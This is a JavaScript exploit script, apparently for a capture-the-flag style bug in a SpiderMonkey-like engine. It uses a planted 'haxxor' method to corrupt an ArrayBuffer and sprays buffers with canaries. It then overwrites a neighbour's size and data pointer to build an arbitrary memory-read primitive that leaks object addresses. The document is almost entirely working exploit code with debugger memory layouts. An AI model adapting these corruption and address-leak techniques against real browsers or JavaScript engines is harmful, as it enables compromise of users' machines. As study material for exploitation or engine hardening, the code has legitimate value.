
// for later conversion
const buf = new ArrayBuffer(8);
const conv = new DataView(buf);

const WORD_SIZE = 8;

// first add an ArrayBuffer we haxxor
const haxxored = new ArrayBuffer(96);
// put a canary here to search for in gdb
new Uint32Array(haxxored)[0] = 0x41414141;

const abs = [];
// hopefully one of these land after our haxxored ArrayBuffer
for(var i = 0; i < 10; i++) {
    // ArrayBuffers with inline buffer backing store
    const x = new ArrayBuffer(96);
    new Uint32Array(x)[0] = 0x13371337;
    abs.push(x);
}

// gc to move all buffers to old space
// TODO Trigger GC

haxxored.haxxor();
const view = new DataView(haxxored);

function hex(val) {
    return ('0'.repeat(8) + val.toString(16)).substr(-8);
}
function addr(val) {
    return ('0'.repeat(16) + val.toString(16)).substr(-16);
}


const M = 0x100000000;
function ReadU64(view, offset) {
    return view.getUint32(offset + 4, true) * M + view.getUint32(offset, true);
}
function WriteU64(view, offset, value) {
    view.setUint32(offset + 4, value / M, true);
    view.setUint32(offset, value % M, true);
}
function ShiftPtr(raw) {
    const high = raw / M;
    const low = raw % M;
    const carry = high & 1 ? 0x80000000 : 0;
    return (((high >> 1) >>> 0) * M) + (((low >> 1) | carry) >>> 0);
}
function UnshiftPtr(x) {
    const low = ((x % M) << 1) >>> 0;
    const carry = low < (x % M) ? 1 : 0;
    const high = (((x / M) << 1) >>> 0) | carry;
    return high * M + low;
}
function RW(arrBuf, offObject, targetView) {
    /*

    NB! Tagged pointers!

    ArrayBuffer memory layout:

    00:0000│   0x7ffff537e240 —▸ 0x7ffff537b8b0     <-- group_
    01:0008│   0x7ffff537e248 —▸ 0x7ffff53aa3d0     <-- shape_
    02:0010│   0x7ffff537e250 —▸ 0x7ffff50f9340     <-- slots_
    03:0018│   0x7ffff537e258 —▸ 0xe23188           <-- elements_   (empty)
    04:0020│   0x7ffff537e260 ◂— 0x3ffffa9bf140     <-- dataPtr (rshifted)
    05:0028│   0x7ffff537e268 ◂— 0xfff8800000000060 <-- size
    06:0030│   0x7ffff537e270 ◂— 0xfffe7ffff7e00440
    07:0038│   0x7ffff537e278 ◂— 0xfff8800000000000
    08:0040│   0x7ffff537e280 ◂— 0x13381338         <-- buffer
    09:0048│   0x7ffff537e288 ◂— 0x0

    slots_:

    00:0000│   0x7ffff50f9340 ◂— 0xfff8800043434343
    01:0008│   0x7ffff50f9348 ◂— 0xe5e5e5e5e5e5e5e5

    */

    print('offset base: '+ hex(offObject))
    this.target = arrBuf;
    this.offSlots = offObject + 2*WORD_SIZE;
    this.offDataPtr = offObject + 4*WORD_SIZE;
    this.offSize = offObject + 5*WORD_SIZE;
    this.view = targetView;
    // stored in slots_[0]
    this.target.a = 0x43434343;

    this.slotsBuf = ReadU64(this.view, this.offSlots);
    this.defaultDataPtr = UnshiftPtr(ReadU64(this.view, this.offDataPtr));

    // fix size
    this.view.setUint32(this.offSize, 0x1000000, true);
}
RW.prototype.setDataPtr = function(addr) {
    // dataPointer is stored rshifted by 1
    WriteU64(this.view, this.offDataPtr, ShiftPtr(addr));
}
RW.prototype.readU64 = function(addr) {
    this.setDataPtr(addr);
    var x = ReadU64(this.view, 0);
    this.setDataPtr(this.defaultDataPtr);
    return x;
}
RW.prototype.readObjAddr = function(obj) {
    this.target.a = obj;
    var x = this.readU64(this.slotsBuf);
    this.target.a = 0x43434343;
    return x;
}


let rw = undefined;

for(var i = 0; i < 0x1338; i += 4) {
    const x = view.getUint32(i, true);
    // look for canaries
    if(x == 0x13371337) {
        print("ArrayBuffer: " + hex(i) + ": " + hex(x));

        // mark arraybuffer
        view.setUint32(i, 0x13381338, true);

        let target = undefined;
        // find our marked arraybuffer
        for(var j = 0; j < abs.length; j++) {
            if(new Uint32Array(abs[j])[0] == 0x13381338) {
                target = abs[j];
                break;
            }
        }
        if(target === undefined) {
            print("Failed to find ArrayBuffer");
            throw 1;
        }

        rw = new RW(target, i - 8*WORD_SIZE, view);
        break;
    }
}

if(rw === undefined) {
    print("Failed to create RW prim");
    throw 2;
}

print("slots_: " + addr(rw.slotsBuf));
print("dataPtr: " + addr(rw.defaultDataPtr));

print('Math.cos: ' + addr(rw.readObjAddr(Math.cos)));
